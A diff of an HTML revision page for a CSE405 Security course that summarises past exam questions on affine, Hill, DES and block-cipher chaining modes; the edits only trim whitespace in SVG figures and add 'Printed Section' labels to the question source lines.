-<path clip-path="url(#fig-0-pe4623215e2)" d="M 497.730287 58.972805 
-Q 357.391946 90.413564 218.471893 121.536577 
+<path clip-path="url(#fig-0-pe4623215e2)" d="M 497.730287 58.972805
+Q 357.391946 90.413564 218.471893 121.536577
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-0-pe4623215e2)" d="M 224.114512 122.936881 
-L 218.471893 121.536577 
-L 222.977707 117.862664 
-L 224.114512 122.936881 
+<path clip-path="url(#fig-0-pe4623215e2)" d="M 224.114512 122.936881
+L 218.471893 121.536577
+L 222.977707 117.862664
+L 224.114512 122.936881
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -346,7 +346,7 @@ z
 <p><a id="s04"></a></p>
 </section><section class="question"><h3>S04 · 2023–24 · Q6(b)</h3>
 <p><strong>Recover affine-cipher keys from two mappings · 20 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=8">root question PDF, page 8</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=8">root question PDF, page 8</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> The diagram implements T = P×K1 mod 26 and C = T+K2 mod 26, with K1 coprime to 26. Given B→E and E→P, set up and solve simultaneous congruences to determine K1 and K2.</p>
 </blockquote>
@@ -363,7 +363,7 @@ z
 <p><a id="s26"></a></p>
 </section><section class="question"><h3>S26 · 2021–22 · Q1(c)</h3>
 <p><strong>Hill encryption and decryption with a 3×3 key · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Given Hill-cipher key GYBNQKURP and plaintext ACT, demonstrate encryption and decryption to judge correctness.</p>
 </blockquote>
@@ -388,7 +388,7 @@ K^{-1}=\begin{pmatrix}8&amp;5&amp;10\\21&amp;8&amp;21\\21&amp;12&amp;8\end{pmatr
 <p><a id="s27"></a></p>
 </section><section class="question"><h3>S27 · 2021–22 · Q1(d)</h3>
 <p><strong>Caesar as symmetric encryption; composition of affine ciphers · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Why is Caesar a symmetric encryption algorithm? If you encrypt using one affine cipher and then a second affine cipher, both modulo 26, is there any advantage over one affine cipher? Derive the result.</p>
 </blockquote>
@@ -403,7 +403,7 @@ K^{-1}=\begin{pmatrix}8&amp;5&amp;10\\21&amp;8&amp;21\\21&amp;12&amp;8\end{pmatr
 <p><a id="s44"></a></p>
 </section><section class="question"><h3>S44 · 2020–21 · Q7(a)</h3>
 <p><strong>Break a Caesar-then-Hill construction · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=20">root question PDF, page 20</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=20">root question PDF, page 20</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Bob applies Caesar followed by Hill, calling it a CH network. He claims it meets Shannon confusion and diffusion because it is a substitution-permutation network. Alice says it is easy to break. Explain an attack.</p>
 </blockquote>
@@ -422,7 +422,7 @@ C_i-C_0=Ke_i=\text{column }i\text{ of }K.
 <p><a id="s61"></a></p>
 </section><section class="question"><h3>S61 · 2018–19 · Q5(a)</h3>
 <p><strong>Hill-cipher numerical encryption · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=27">root question PDF, page 27</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=27">root question PDF, page 27</a>. Sitting date: 24 October 2019. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Encrypt plaintext DITECTIVE using Hill cipher, block size m=3 and K=[[3,0,2],[2,0,2],[0,1,1]].</p>
 </blockquote>
@@ -438,7 +438,7 @@ C_i-C_0=Ke_i=\text{column }i\text{ of }K.
 <p><a id="s36"></a></p>
 <section class="question"><h3>S36 · 2021–22 · Q4(c)</h3>
 <p><strong>DES attack; meet-in-the-middle strength of fivefold DES · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain an attack on DES. A proposed 5DES alternates five DES encryptions/decryptions using independent keys and claims 280-bit strength, exceeding AES-256. Compute the effective key strength and assess the claim.</p>
 </blockquote>
@@ -458,7 +458,7 @@ C=E_{k_5}\!\left(D_{k_4}\!\left(E_{k_3}\!\left(D_{k_2}\!\left(E_{k_1}(P)\right)\
 <p><a id="s37"></a></p>
 </section><section class="question"><h3>S37 · 2021–22 · Q4(d)</h3>
 <p><strong>Compare DES components with AES · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> For each DES component, identify its AES counterpart or explain why none is needed: (i) XOR of subkey with the f-function input, (ii) XOR of f output with the left half, (iii) f itself, (iv) permutation P, (v) swapping block halves.</p>
 </blockquote>
@@ -498,7 +498,7 @@ C=E_{k_5}\!\left(D_{k_4}\!\left(E_{k_3}\!\left(D_{k_2}\!\left(E_{k_1}(P)\right)\
 <p><a id="s51"></a></p>
 </section><section class="question"><h3>S51 · 2019–20 · Q6(a)</h3>
 <p><strong>OTP encryption/decryption; transposition as a Hill cipher · 14 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain how the pad P is used directly for both encryption and decryption in a binary OTP. Define transposition cipher and explain why it is a special case of Hill cipher.</p>
 </blockquote>
@@ -517,7 +517,7 @@ C=E_{k_5}\!\left(D_{k_4}\!\left(E_{k_3}\!\left(D_{k_2}\!\left(E_{k_1}(P)\right)\
 <p><a id="s63"></a></p>
 </section><section class="question"><h3>S63 · 2018–19 · Q6(a)</h3>
 <p><strong>Trace P-box and S-box diagrams · 8 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=27">root question PDF, page 27</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=27">root question PDF, page 27</a>. Sitting date: 24 October 2019. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> For the supplied P-box, find the output for input bits designated top-to-bottom 01234567. For the supplied S-box, find the output sequence for successive input octal numbers 76543210.</p>
 </blockquote>
@@ -568,7 +568,7 @@ output: 2 1 5 6 0 3 7 4
 <p><a id="s02"></a></p>
 <section class="question"><h3>S02 · 2023–24 · Q5(b)</h3>
 <p><strong>Unfamiliar chaining diagram; equations, parallelism and malleability · 20 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=7">root question PDF, page 7</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=7">root question PDF, page 7</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> For the supplied block-cipher diagram with IV1 and IV2, derive encryption/decryption equations for the first three blocks; draw the decryption diagram; determine which operations parallelize. Given two known plaintext/ciphertext pairs and intercepted IV1, IV2, C1, C2, modify the transmitted values so Bob obtains chosen P1′ and P2′ without learning the key.</p>
 </blockquote>
@@ -606,194 +606,194 @@ C_3&amp;=E_K(P_3\oplus C_2), &amp; P_3&amp;=D_K(C_3)\oplus C_2.
 </defs>
 <g id="fig-2-figure_1">
 <g id="fig-2-patch_1">
-<path d="M 0 189.186281 
-L 575.28 189.186281 
-L 575.28 0 
-L 0 0 
+<path d="M 0 189.186281
+L 575.28 189.186281
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-2-axes_1">
 <g id="fig-2-patch_2">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 24.822 60.241481 
-L 176.598 60.241481 
-Q 180.504 60.241481 180.504 56.360681 
-L 180.504 33.075881 
-Q 180.504 29.195081 176.598 29.195081 
-L 24.822 29.195081 
-Q 20.916 29.195081 20.916 33.075881 
-L 20.916 56.360681 
-Q 20.916 60.241481 24.822 60.241481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 24.822 60.241481
+L 176.598 60.241481
+Q 180.504 60.241481 180.504 56.360681
+L 180.504 33.075881
+Q 180.504 29.195081 176.598 29.195081
+L 24.822 29.195081
+Q 20.916 29.195081 20.916 33.075881
+L 20.916 56.360681
+Q 20.916 60.241481 24.822 60.241481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_3">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 55.512 112.909481 
-L 145.908 112.909481 
-Q 149.814 112.909481 149.814 109.028681 
-L 149.814 82.971881 
-Q 149.814 79.091081 145.908 79.091081 
-L 55.512 79.091081 
-Q 51.606 79.091081 51.606 82.971881 
-L 51.606 109.028681 
-Q 51.606 112.909481 55.512 112.909481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 55.512 112.909481
+L 145.908 112.909481
+Q 149.814 112.909481 149.814 109.028681
+L 149.814 82.971881
+Q 149.814 79.091081 145.908 79.091081
+L 55.512 79.091081
+Q 51.606 79.091081 51.606 82.971881
+L 51.606 109.028681
+Q 51.606 112.909481 55.512 112.909481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_4">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 100.71 63.352131 
-Q 100.71 69.668884 100.71 74.532193 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 100.71 63.352131
+Q 100.71 69.668884 100.71 74.532193
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 103.31 69.332193 
-L 100.71 74.532193 
-L 98.11 69.332193 
-L 103.31 69.332193 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 103.31 69.332193
+L 100.71 74.532193
+L 98.11 69.332193
+L 103.31 69.332193
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-2-patch_5">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 24.822 168.349481 
-L 176.598 168.349481 
-Q 180.504 168.349481 180.504 164.468681 
-L 180.504 138.411881 
-Q 180.504 134.531081 176.598 134.531081 
-L 24.822 134.531081 
-Q 20.916 134.531081 20.916 138.411881 
-L 20.916 164.468681 
-Q 20.916 168.349481 24.822 168.349481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 24.822 168.349481
+L 176.598 168.349481
+Q 180.504 168.349481 180.504 164.468681
+L 180.504 138.411881
+Q 180.504 134.531081 176.598 134.531081
+L 24.822 134.531081
+Q 20.916 134.531081 20.916 138.411881
+L 20.916 164.468681
+Q 20.916 168.349481 24.822 168.349481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_6">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 100.71 116.022161 
-Q 100.71 123.721799 100.71 129.967993 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 100.71 116.022161
+Q 100.71 123.721799 100.71 129.967993
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 103.31 124.767993 
-L 100.71 129.967993 
-L 98.11 124.767993 
-L 103.31 124.767993 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 103.31 124.767993
+L 100.71 129.967993
+L 98.11 124.767993
+L 103.31 124.767993
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-2-patch_7">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 211.752 60.241481 
-L 363.528 60.241481 
-Q 367.434 60.241481 367.434 56.360681 
-L 367.434 33.075881 
-Q 367.434 29.195081 363.528 29.195081 
-L 211.752 29.195081 
-Q 207.846 29.195081 207.846 33.075881 
-L 207.846 56.360681 
-Q 207.846 60.241481 211.752 60.241481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 211.752 60.241481
+L 363.528 60.241481
+Q 367.434 60.241481 367.434 56.360681
+L 367.434 33.075881
+Q 367.434 29.195081 363.528 29.195081
+L 211.752 29.195081
+Q 207.846 29.195081 207.846 33.075881
+L 207.846 56.360681
+Q 207.846 60.241481 211.752 60.241481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_8">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 242.442 112.909481 
-L 332.838 112.909481 
-Q 336.744 112.909481 336.744 109.028681 
-L 336.744 82.971881 
-Q 336.744 79.091081 332.838 79.091081 
-L 242.442 79.091081 
-Q 238.536 79.091081 238.536 82.971881 
-L 238.536 109.028681 
-Q 238.536 112.909481 242.442 112.909481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 242.442 112.909481
+L 332.838 112.909481
+Q 336.744 112.909481 336.744 109.028681
+L 336.744 82.971881
+Q 336.744 79.091081 332.838 79.091081
+L 242.442 79.091081
+Q 238.536 79.091081 238.536 82.971881
+L 238.536 109.028681
+Q 238.536 112.909481 242.442 112.909481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_9">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 287.64 63.352131 
-Q 287.64 69.668884 287.64 74.532193 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 287.64 63.352131
+Q 287.64 69.668884 287.64 74.532193
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 290.24 69.332193 
-L 287.64 74.532193 
-L 285.04 69.332193 
-L 290.24 69.332193 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 290.24 69.332193
+L 287.64 74.532193
+L 285.04 69.332193
+L 290.24 69.332193
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-2-patch_10">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 211.752 168.349481 
-L 363.528 168.349481 
-Q 367.434 168.349481 367.434 164.468681 
-L 367.434 138.411881 
-Q 367.434 134.531081 363.528 134.531081 
-L 211.752 134.531081 
-Q 207.846 134.531081 207.846 138.411881 
-L 207.846 164.468681 
-Q 207.846 168.349481 211.752 168.349481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 211.752 168.349481
+L 363.528 168.349481
+Q 367.434 168.349481 367.434 164.468681
+L 367.434 138.411881
+Q 367.434 134.531081 363.528 134.531081
+L 211.752 134.531081
+Q 207.846 134.531081 207.846 138.411881
+L 207.846 164.468681
+Q 207.846 168.349481 211.752 168.349481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_11">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 287.64 116.022161 
-Q 287.64 123.721799 287.64 129.967993 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 287.64 116.022161
+Q 287.64 123.721799 287.64 129.967993
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 290.24 124.767993 
-L 287.64 129.967993 
-L 285.04 124.767993 
-L 290.24 124.767993 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 290.24 124.767993
+L 287.64 129.967993
+L 285.04 124.767993
+L 290.24 124.767993
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-2-patch_12">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 398.682 60.241481 
-L 550.458 60.241481 
-Q 554.364 60.241481 554.364 56.360681 
-L 554.364 33.075881 
-Q 554.364 29.195081 550.458 29.195081 
-L 398.682 29.195081 
-Q 394.776 29.195081 394.776 33.075881 
-L 394.776 56.360681 
-Q 394.776 60.241481 398.682 60.241481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 398.682 60.241481
+L 550.458 60.241481
+Q 554.364 60.241481 554.364 56.360681
+L 554.364 33.075881
+Q 554.364 29.195081 550.458 29.195081
+L 398.682 29.195081
+Q 394.776 29.195081 394.776 33.075881
+L 394.776 56.360681
+Q 394.776 60.241481 398.682 60.241481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_13">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 429.372 112.909481 
-L 519.768 112.909481 
-Q 523.674 112.909481 523.674 109.028681 
-L 523.674 82.971881 
-Q 523.674 79.091081 519.768 79.091081 
-L 429.372 79.091081 
-Q 425.466 79.091081 425.466 82.971881 
-L 425.466 109.028681 
-Q 425.466 112.909481 429.372 112.909481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 429.372 112.909481
+L 519.768 112.909481
+Q 523.674 112.909481 523.674 109.028681
+L 523.674 82.971881
+Q 523.674 79.091081 519.768 79.091081
+L 429.372 79.091081
+Q 425.466 79.091081 425.466 82.971881
+L 425.466 109.028681
+Q 425.466 112.909481 429.372 112.909481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_14">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 474.57 63.352131 
-Q 474.57 69.668884 474.57 74.532193 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 474.57 63.352131
+Q 474.57 69.668884 474.57 74.532193
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 477.17 69.332193 
-L 474.57 74.532193 
-L 471.97 69.332193 
-L 477.17 69.332193 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 477.17 69.332193
+L 474.57 74.532193
+L 471.97 69.332193
+L 477.17 69.332193
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-2-patch_15">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 398.682 168.349481 
-L 550.458 168.349481 
-Q 554.364 168.349481 554.364 164.468681 
-L 554.364 138.411881 
-Q 554.364 134.531081 550.458 134.531081 
-L 398.682 134.531081 
-Q 394.776 134.531081 394.776 138.411881 
-L 394.776 164.468681 
-Q 394.776 168.349481 398.682 168.349481 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 398.682 168.349481
+L 550.458 168.349481
+Q 554.364 168.349481 554.364 164.468681
+L 554.364 138.411881
+Q 554.364 134.531081 550.458 134.531081
+L 398.682 134.531081
+Q 394.776 134.531081 394.776 138.411881
+L 394.776 164.468681
+Q 394.776 168.349481 398.682 168.349481
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-2-patch_16">
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 474.57 116.022161 
-Q 474.57 123.721799 474.57 129.967993 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 474.57 116.022161
+Q 474.57 123.721799 474.57 129.967993
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 477.17 124.767993 
-L 474.57 129.967993 
-L 471.97 124.767993 
-L 477.17 124.767993 
+<path clip-path="url(#fig-2-pc52c4f43a7)" d="M 477.17 124.767993
+L 474.57 129.967993
+L 471.97 124.767993
+L 477.17 124.767993
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -889,7 +889,7 @@ IV_2'&amp;=IV_2\oplus\Delta_2, &amp; C_2'&amp;=C_2.
 <p><a id="s14"></a></p>
 </section><section class="question"><h3>S14 · 2022–23 · Q5(a)</h3>
 <p><strong>ECB/CBC/CTR comparison · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=12">root question PDF, page 12</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=12">root question PDF, page 12</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Compare ECB, CBC and CTR, with diagrams, for (i) IND-CPA security, (ii) encryption/decryption parallelism and (iii) robustness to incorrect IV/nonce usage.</p>
 </blockquote>
@@ -917,133 +917,133 @@ IV_2'&amp;=IV_2\oplus\Delta_2, &amp; C_2'&amp;=C_2.
 </defs>
 <g id="fig-3-figure_1">
 <g id="fig-3-patch_1">
-<path d="M 0 183.6 
-L 575.28 183.6 
-L 575.28 0 
-L 0 0 
+<path d="M 0 183.6
+L 575.28 183.6
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-3-axes_1">
 <g id="fig-3-patch_2">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 19.242 85.1472 
-L 126.378 85.1472 
-Q 130.284 85.1472 130.284 81.2664 
-L 130.284 52.4376 
-Q 130.284 48.5568 126.378 48.5568 
-L 19.242 48.5568 
-Q 15.336 48.5568 15.336 52.4376 
-L 15.336 81.2664 
-Q 15.336 85.1472 19.242 85.1472 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 19.242 85.1472
+L 126.378 85.1472
+Q 130.284 85.1472 130.284 81.2664
+L 130.284 52.4376
+Q 130.284 48.5568 126.378 48.5568
+L 19.242 48.5568
+Q 15.336 48.5568 15.336 52.4376
+L 15.336 81.2664
+Q 15.336 85.1472 19.242 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-3-patch_3">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 195.012 85.1472 
-L 290.988 85.1472 
-Q 294.894 85.1472 294.894 81.2664 
-L 294.894 52.4376 
-Q 294.894 48.5568 290.988 48.5568 
-L 195.012 48.5568 
-Q 191.106 48.5568 191.106 52.4376 
-L 191.106 81.2664 
-Q 191.106 85.1472 195.012 85.1472 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 195.012 85.1472
+L 290.988 85.1472
+Q 294.894 85.1472 294.894 81.2664
+L 294.894 52.4376
+Q 294.894 48.5568 290.988 48.5568
+L 195.012 48.5568
+Q 191.106 48.5568 191.106 52.4376
+L 191.106 81.2664
+Q 191.106 85.1472 195.012 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-3-patch_4">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 367.992 85.1472 
-L 463.968 85.1472 
-Q 467.874 85.1472 467.874 81.2664 
-L 467.874 52.4376 
-Q 467.874 48.5568 463.968 48.5568 
-L 367.992 48.5568 
-Q 364.086 48.5568 364.086 52.4376 
-L 364.086 81.2664 
-Q 364.086 85.1472 367.992 85.1472 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 367.992 85.1472
+L 463.968 85.1472
+Q 467.874 85.1472 467.874 81.2664
+L 467.874 52.4376
+Q 467.874 48.5568 463.968 48.5568
+L 367.992 48.5568
+Q 364.086 48.5568 364.086 52.4376
+L 364.086 81.2664
+Q 364.086 85.1472 367.992 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-3-patch_5">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 133.399012 66.852 
-Q 160.694561 66.852 186.536667 66.852 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 133.399012 66.852
+Q 160.694561 66.852 186.536667 66.852
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-3-p4cde781957)" d="M 181.336667 64.252 
-L 186.536667 66.852 
-L 181.336667 69.452 
-L 181.336667 64.252 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 181.336667 64.252
+L 186.536667 66.852
+L 181.336667 69.452
+L 181.336667 64.252
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-3-patch_6">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 298.008501 66.852 
-Q 329.488104 66.852 359.514264 66.852 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 298.008501 66.852
+Q 329.488104 66.852 359.514264 66.852
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-3-p4cde781957)" d="M 354.314264 64.252 
-L 359.514264 66.852 
-L 354.314264 69.452 
-L 354.314264 64.252 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 354.314264 64.252
+L 359.514264 66.852
+L 354.314264 69.452
+L 354.314264 64.252
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-3-patch_7">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 19.242 157.2192 
-L 126.378 157.2192 
-Q 130.284 157.2192 130.284 153.3384 
-L 130.284 124.5096 
-Q 130.284 120.6288 126.378 120.6288 
-L 19.242 120.6288 
-Q 15.336 120.6288 15.336 124.5096 
-L 15.336 153.3384 
-Q 15.336 157.2192 19.242 157.2192 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 19.242 157.2192
+L 126.378 157.2192
+Q 130.284 157.2192 130.284 153.3384
+L 130.284 124.5096
+Q 130.284 120.6288 126.378 120.6288
+L 19.242 120.6288
+Q 15.336 120.6288 15.336 124.5096
+L 15.336 153.3384
+Q 15.336 157.2192 19.242 157.2192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-3-patch_8">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 195.012 157.2192 
-L 290.988 157.2192 
-Q 294.894 157.2192 294.894 153.3384 
-L 294.894 124.5096 
-Q 294.894 120.6288 290.988 120.6288 
-L 195.012 120.6288 
-Q 191.106 120.6288 191.106 124.5096 
-L 191.106 153.3384 
-Q 191.106 157.2192 195.012 157.2192 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 195.012 157.2192
+L 290.988 157.2192
+Q 294.894 157.2192 294.894 153.3384
+L 294.894 124.5096
+Q 294.894 120.6288 290.988 120.6288
+L 195.012 120.6288
+Q 191.106 120.6288 191.106 124.5096
+L 191.106 153.3384
+Q 191.106 157.2192 195.012 157.2192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-3-patch_9">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 367.992 157.2192 
-L 463.968 157.2192 
-Q 467.874 157.2192 467.874 153.3384 
-L 467.874 124.5096 
-Q 467.874 120.6288 463.968 120.6288 
-L 367.992 120.6288 
-Q 364.086 120.6288 364.086 124.5096 
-L 364.086 153.3384 
-Q 364.086 157.2192 367.992 157.2192 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 367.992 157.2192
+L 463.968 157.2192
+Q 467.874 157.2192 467.874 153.3384
+L 467.874 124.5096
+Q 467.874 120.6288 463.968 120.6288
+L 367.992 120.6288
+Q 364.086 120.6288 364.086 124.5096
+L 364.086 153.3384
+Q 364.086 157.2192 367.992 157.2192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-3-patch_10">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 133.399012 138.924 
-Q 160.694561 138.924 186.536667 138.924 
